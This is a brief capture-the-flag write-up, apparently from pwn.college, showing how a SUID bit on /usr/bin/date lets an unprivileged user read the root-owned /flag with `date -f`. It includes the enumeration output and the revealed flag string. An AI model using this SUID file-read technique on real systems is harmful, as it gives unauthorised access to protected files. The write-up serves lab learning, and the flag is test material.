# Challenge Name: date

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/date`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/date
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/date
```

- The `s` in `-rws` indicates it's a SUID binary.
- `date` runs with **root privileges**.

## 🚀 Exploitation

ChatGPT said:
The -f option in the `date` command is used to read dates from a file or standard input — but only on some systems, primarily GNU date, and not available in all environments (like BusyBox or macOS).
But input /flag as file make's to reveal flag as error

```bash
date -f "/flag"
```

Output:
```
date: invalid date ‘pwn.college{AMAWCECKul4SQGZcWJO3xDlWzlZ.ddDOxwSM0IzMyEzW}’
```
